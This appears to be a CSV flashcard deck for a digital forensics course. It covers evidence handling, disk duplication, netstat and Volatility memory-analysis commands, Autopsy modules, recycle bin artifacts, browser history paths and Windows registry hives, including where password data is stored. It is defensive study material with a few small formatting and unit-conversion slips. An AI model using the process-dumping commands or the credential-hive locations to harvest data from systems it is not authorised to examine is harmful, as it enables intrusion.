Alternate Data Streams,Use command: <samp>dir /r</samp> to reveal ADS hidden in files.
netstat options,"(If unsure, typically use netstat -anb)<br><samp>-a</samp>: Disp. all connections & listening ports<br><samp>-b</samp>: Disp. executable involved in creating each connection/listening port. Need sufficient perms.<br><samp>-e</samp>: Disp. Ethernet stats, can be combined with -s<br><samp>-f:</samp> Disp. Fully Qualified Domain Names (FQDN) for foreign addresses.<br><samp>-n</samp>: Disp. addr and port no. in numerical form.<br><samp>-o</samp>: Disp. process ID associated w. each connection.<br><samp>-p <protocol></samp>: Shows connections for the protocol specified. Proto can be: TCP, UDP, TCPv6, UDPv6. If used with -s, can also use IP, IPv6, ICMP & ICMPv6.<br><samp>-q</samp>: Disp. all conn., listening ports, and bound non listening TCP ports. Bound non listening ports may or may not be assoc. with an active conn.<br><samp>-r</samp>: Disp. routing table.<br><samp>-s</samp>: Disp. per protocol statistics. By default, IP, IPv6, ICMP, ICMPv6, TCP, TCPv6, UDP, UDPv6.<br><samp>-t</samp>: Disp. current conn. offload state<br><samp>-x</samp>: Disp. NetworkDirect conns, listeners & shared endpoints.<br><samp>-y</samp>: Disp. TCP conn. template for all conns. Cannot be combined with other options."
Non-volatile data,"Sys. Version, Patch Level, File System Time & Date Stamps, Sys. Event Logs, User Accs., Sus. files"
Order of volatility,"Hierarchy of which types of data are more susceptible to changes. 1. Registers, Caches, Main Memory, Peripheral Memory, 2. Swap Files, 3. Network Processes, 4. System Processes, 5. File System Information, 6. Raw Disk Blocks, 7. Peripheral Data Storages"
Prevent accidental tampering with duplicated evidence,Use a write-blocker tool when connecting the duplicated disk to the PC.
Procedure before live forensics,"Don't unplug the power, isolate the system, plan and identify possible locations where data can be found."
Procedure/steps for collecting and preserving electronic evidence,"<ol><li>If the device is on, unplug the power cable from the device. This will ""freeze"" the media/hard drive in its current state. This should not be done for UNIX based systema or MS Exchange servers as serious file system damage could occur. Use the normal shutdown procedure. If it's a laptop, unplug the power cord and the battery.</li><li>Remove storage devices from the computer (e.g. hard drives, solid-state drives (SSD))</li><li>Store storage devices into anti-static evidence bags.</li><li>Seal the computer by placing evidence tape along the computer's housing, as well as ports on the computer.</li></ul>"
Process of Forensic Investigation,"<ol><li><b>Assessment:</b> Computer forensic examiners should assess digital evidence thoroughly with respect to the scope of the case to determine the course of action to take.</li><li><b>Acquisition:</b> Digital evidence, by its very nature, is fragile and can be altered, damaged, or destroyed by improper handling or examination. Examination is best conducted on a copy of the original evidence. The original evidence should be acquired in a manner that protects and preserves the integrity of the evidence.</li><li><b>Examination:</b> The purpose of the examination process is to extract and analyze digital evidence. Extraction refers to the recovery of data from its media. Analysis refers to the interpretation of the recovered data and putting it in a logical and useful format.</li><li><b>Documenting and Reporting:</b> Actions and observations should be documented throughout the forensic processing of evidence. This will conclude with the preparation of a written report of the findings.</li></ol>"
Redline purposes,"Audit and collect all running processes and drivers from memory, file-system metadata, registry data, event logs, network info, services, tasks and web history."
route print (netstat -r) purpose,Check for sus routing of data to check for attackers rerouting traffic to avoid security device like firewall or sniff data on network connections.
Selecting destination hard disk and ports,Selecting the most appropiate drive for bit-stream imaging:<ul><li>Size must be larger than or equal to the size of the source disk.</li><li>SSDs are better than HDDs as they have no moving parts and thus less risk of being damaged in transport.</li><li>Try to have a disk with the smallest size as possible as larger capacity means longer time for wiping and hashing.</li></ul>
Steps to use Talon duplicator,<ol><li>Connect Disk A (Suspect) and Disk C (Destination) to the source and destination ports of the Talon Duplicator using SATA cables respectively.</li><li>Ensure that drive to drive/image mode is selected.</li><li>Select the hashing algorithm (usually MD5).</li><li>Perform a wipe on the destination disk.</li><li>Start duplication</li></ol>
The purposeof using an anti-static bag is to…, Isolate the evidence from shocks due to electrical discharge.
Tools for live forensic analysis,<ul><li>Volatility</li><li>ProcMon (Process Monitor)</li></ul><br>Related questions:<i><ul><li>Provide the name of another program or tool which the digital forensics investigator can use in his live forensics analysis.</li></ul></i>
Types of File Systems & Max Size,"Windows: FAT (File Allocation Table) - FAT16/FAT32, exFAT (extended FAT), NTFS (New Technology File System), HFS (Hierarchical File System - can read but can't write)<br><br><b>List of File Systems and Maximum Filesizes</b><table><thead><td>FAT type</td><td>Max files</td><td>Max file size</td><td>Max volume size</td></thead><tbody><tr><td>FAT12</td><td>4,096</td><td>32MB</td><td>32MB</td></tr><tr><td>FAT16</td><td>65,536</td><td>2GB</td><td>2GB</td></tr><tr><td>FAT32</td><td>268,435,456</td><td>4GB</td><td>2TB</td></tr><tr><td>NTFS</td><td>4,294,967,296</td><td>256TB</td><td>256TB</td></tr></tbody></table>"
Volatile data,"Internal Routing Table, Running Processes / Services, Scheduled Jobs, Open Files, Process Mem Dumps, data in DRAM, data in memory registers."
Volatility Commands,"<ul><li>imageinfo: <samp>volatility.exe -f memdump.mem imageinfo</samp></li><li>netscan: volatility.exe -f memdump.mem --profile=Win7SP1x86 netscan (OPTIONAL - add this to filter established connections: <samp>| findstr ""ESTABLISHED""</samp>)</li><li>pslist: <samp>volatility.exe -f memdump.mem --profile=Win7SP1x86 pslist</samp></li><li>psscan:<samp> volatility.exe -f memdump.mem --profile=Win7SP1x86 psscan</samp></li><li>pstree: <samp>volatility.exe -f memdump.mem --profile=Win7SP1x86 pstree</samp></li><li>cmdline: <samp>volatility.exe -f memdump.mem --profile=Win7SP1x86 cmdline</samp></li><li>memdump: <samp>volatility.exe -f memdump.mem --profile=Win7SP1x86 memdump --dump-dir=./ -p 2912</samp> (2912 is a PID)</li><li>procdump: <samp>volatility.exe -f memdump.mem --profile=Win7SP1x86 procdump --dump-dir=./ -p 4048</samp></li></ul>"
Volatility Plugins,<b>imageinfo</b>: Identify info for the image<br><b>netscan</b>: Scan for TCP connections and sockets<br><b>pslist</b>: High level view of running processes<br><b>psscan</b>: Scan memory for EPROCESS blocks<br><b>pstree</b>: Disp. parent-child process relationships<br><b>cmdline</b>: Displays commands and arguments executed via command prompt.<br><b>memdump</b>: Extract every memory section into one file<br><b>procdump</b>: Dump process to executable sample.
When to do live forensics?,If the system needs to be kept running and the response team used the OS and other local applications to view log files and account information. See Why Live Forensics for reasons.
Which of the following file extensions are considered to be forensically examinable disk image formats?,.aff and .e01
Which of the following statement is TRUE with regards to hashing?,Compressing a file will result in a change to its hash value.
Why live forensics?,If there is no suitable media (e.g. server too big) or no time to do bit-stream imaging.
Calculation of Duplication/Transfer Rate,"<ol><li>Convert the size of the disk to bytes. MB is 10^6, GB is 10^9, and so on. Example: 640 GB = 640,000,000,000 Bytes</li><li>Convert time for transfer to seconds</li><li>Divide the size in bytes by the time in seconds</li><li>Convert to suitable units by dividing by 1024. MB is /1024/1024, GB is /1024/1024, and so on.</li></ol>"
Calculation of File Slack,"File slack is the space between the end of a file and the end of the last cluster used by that file.<br><br>Example:<br>Consider an NTFS file system with a 2048-byte cluster and 512-byte sectors. A file of 2543 bytes resides in 2 clusters.<br>To calculate the size of the file slack, since the file takes up 1 entire cluster and has some left, we use that remaining file size to subtract from the size of the remaining cluster.<br><i>2048 - (2543-2048) = 1553 bytes<i>"
Ingest modules in Autopsy,<ol><li>Recent Activity</li><li>Hash Lookup</li><li>File Type Identification</li><li>Embedded File Extractor</li><li>Exif Parser</li><li>Keyword Search</li><li>Email Parser</li><li>Extension Mismatch Detector</li><li>E01 Verifier</li><li>Android Analyzer (Typically not used)</li><li>Interesting Files Identifier</li><li>PhotoRec Carver</li><li>Virtual Machine Extractor</li></ol><br>Related questions:<i><ul><li>Provide the name of another program or tool which the digital forensics investigator can use in his live forensics analysis.</li></ul></i>
Deleted Files in Windows Vista & Windows 7/8/10,"<ul><li>Recycle bin folder is <b>\$Recycle.Bin</b> at the root of the volume.</li><li>No INFO2 File unlike Windows XP.</li><li>When a file is moved to the recycle bin, it is renamed with a random file name starting with <b class='red'>$R</b>, with its extension unchanged from the original deleted file.  </li><li>Accompanying this file is an administrative file with the same  random file name and extension, starting with <b class='red'>$I</b>.</li><li>This file contains the information which Vista/Windows 7/8/10 uses to store the deleted files original name and location.</li></ul>"
Internet History Files,"<h3>Windows XP</h3><ul><li>C:\Documents and Settings\<i><i>user_name</i></i>\Local Settings\History</li><li>C:\Documents and Settings\<i><i>user_name</i></i>\Local Settings\Temporary Internet Files</li><li>C:\Documents and Settings\<i><i>user_name</i></i>\Recent</li><li>C:\Documents and Settings\<i><i>user_name</i></i>\Cookies</li><li>C:\Documents and Settings\<i>user_name</i>\Favorites</li></ul><h3>Windows Vista, Windows 7</h3><ul><li>C:\Users\<i>user_name</i>\Roaming\Microsoft\Windows\Cookies</li><li>C:\Users\<i>user_name</i>\Local\Microsoft\Windows\History\</li><li>C:\Users\<i>user_name</i>\Local\Microsoft\Windows\Temporary Internet Files</li><li>C:\Users\<i>user_name</i>\Roaming\Microsoft\Internet Explorer\Userdata</li></ul><h3>Windows 8, Windows 10</h3><ul><li>C:\Users\{user}\AppData\Local\Microsoft\Internet Explorer\IECompatData\</li><li>C:\Users\{user}\AppData\Local\Microsoft\Windows\History\</li><li>C:\Users\{user}\AppData\Local\Microsoft\Windows\WebCache\</li><li>C:\Users\{user}\AppData\LocalLow\Microsoft\Internet Explorer\DOMStore</li></ul><h3>Mac OS X</h3><ul><li>History.plist (contains the internet history list)</li><li>Bookmarks.plist (contains the book mark list)</li><li>Downloads.plist (contains the recently downloaded  list)</li><br>Alternatively:<li>/Users/{user}/Library/Safari/</li><li>/Users/{user}/Library/Caches/com.apple.Safari/</li><li>/Users/{user}/Library/Cookies/</li></ul>"
INFO/INFO2,"Only used in Windows XP. Each user has a hidden file called INFO2 created the first time the Recycle Bin is used. It is used to keep track of the deleted files and folders original location, along with file size and deletion time.<br><br>When a file is sent to the Recycle Bin, the file is renamed using the following convention:<br><samp>D%DriveLetter%_%IndexNumber%_%FileExtension%</samp><br><br><b>D%DriveLetter%</b>:<ul><li>The ""D"" stands for Drive.</li><li>%DriveLetter% is the drive that the file resided on.</li><li>Each drive has its own Recycler directory and INFO2 file for each user that has deleted files from the drive.</li><li>The INFO2 files for Drive C: will only have entries related to Drive C:, the INFO2 files for Drive D: will only have entries related to Drive D: and so forth.</li></ul>"
Which of the following information is in the metadata of a file?,"<ol><li class='red'>The initial user (author) who created the file</li><li class='red'>The size of the file</li><li>The user who deleted the file</li><li class='red'>The last modified date/time of the file</li><li class='red'>The format type of the file</li></ol>1, 2, 4 and 5."
Windows Registry Files,"On Windows systems, the registry information is primarily stored in the following files:<ul><li>SAM</li><li>SYSTEM</li><li>SECURITY</li><li>SOFTWARE</li><li>NTUSER.DAT</li></ul><br><h3>SAM</h3>The Security Accounts Manager (SAM) file contains <b>user account management</b> and <b>security settings</b> such as user logon passwords, group definitions, and domain associations<br><br>The SAM file represents a hive in the Windows registry.<br><br>On Windows 2K systems, the SAM file is located in the Winnt\system32\config directory. On Windows XP/7/8/10, it is located in Windows\system32\config directory<br><br><h3>SYSTEM</h3>The SYSTEM file contains Windows system settings such as the following:<ul><li>Information about drive letter mapping</li><li>System boot profile</li><li>Last Known Good Configuration</li><li>System name</li><li>Windows Setup Information</li><li>Configuration data for the system’s active hardware profile</li></ul>The SYSTEM file represents a hive in the Windows registry<br><br>Located in WinNT\System32\Config directory on Windows 2K systems and Windows\System32\Config directory on Windows XP/7/8/10<br><br><h3>SECURITY</h3>The SECURITY file contains security settings such as user and group policies. Examples of policies include whether a particular user is allowed to reboot the machine, load device drivers, backup files or access the system remotely<br><br>The SECURITY file represents a hive in the Windows registry<br><br>Located in WinNT\System32\Config directory on Windows 2K systems, and Windows\System32\Config directory on Windows XP/7/8/10<br><br><h3>SOFTWARE</h3>The SOFTWARE file contains a listing of all installed programs; their settings; paths to application files and directories; licensing; expiration date information<br><br>The SOFTWARE file represents a hive in the Windows Registry<br><br>Located in WinNT\System32\Config directory on Windows 2K systems, and in Windows\System32\Config directory on Windows XP/7/8/10<br><br><h3>NTUSER</h3>The NTUSER.DAT file contains some of the following information for its corresponding user:<ul><li>Protected storage information</li><li>Most Recently Used (MRU) list of files</li><li>User Preference settings such as desktop configuration</li></ul>"
Location of Windows Registries,"<table><tr><td>Last Login Time</td><td>SAM\Domains\Account\Users\<i>user_id</i> > Key ""F"" > Bytes 8 - 15 (use DCODE to convert the time to a timezone)</td></tr><tr><td>Last Logged On Users/td><td>SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI</td></tr><tr><td>MRU</td><td>Use the Search feature to look for different MRUs</td></tr><tr><td>Microsoft Office MRUs</td><td>SOFTWARE\Microsoft\Office\14.0\<i>application name</i>\FileMRU (application name is the name of the app, such as Word, Excel, PowerPoint. Version number may not always be 14.0)</td></tr><tr><td>Mounted Devices</td><td>SYSTEM\MountedDevices</td></tr><tr><td>Recent Typed URLs</td><td>NTUSER.DAT\Software\Microsoft\Internet Explorer\TypedURLs</td></tr><tr><td>Time Zone</td><td>SYSTEM\ControlSet001\Control\TimeZoneInformation</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></table>"
